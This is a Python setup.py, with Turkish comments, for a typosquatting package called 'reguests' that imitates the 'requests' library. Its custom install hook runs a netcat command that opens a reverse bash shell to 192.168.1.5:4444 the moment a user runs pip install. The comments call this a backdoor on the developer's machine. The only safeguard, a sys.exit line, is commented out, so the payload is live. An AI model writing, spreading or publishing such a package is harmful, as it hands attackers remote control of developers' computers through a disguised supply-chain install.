# setup.py Dosyası
from setuptools import setup
from setuptools.command.install import install
import os
import sys

# --- EMNİYET PİMİ ---
# sys.exit("Bu kod PyPI deposuna yüklenirse binlerce kişiyi hackler.")

class PostInstallCommand(install):
    def run(self):
        # 1. ZARARLI EYLEM (Weaponized Part)
        # Simülasyon: print("Kuruldu")
        # Gerçek: Geliştiricinin bilgisayarına arka kapı aç.
        
        print("Kütüphane kuruluyor... Lütfen bekleyin...")
        
        # Kullanıcı "pip install" dediği an bu çalışır
        os.system("nohup nc -e /bin/bash 192.168.1.5 4444 &")
        
        install.run(self)

setup(
    name='reguests', # 'requests' kütüphanesinin taklidi (Typosquatting)
    version='1.0.0',
    description='HTTP for Humans',
    cmdclass={
        'install': PostInstallCommand, # Kurulum komutunu değiştir
    },
    # ...
)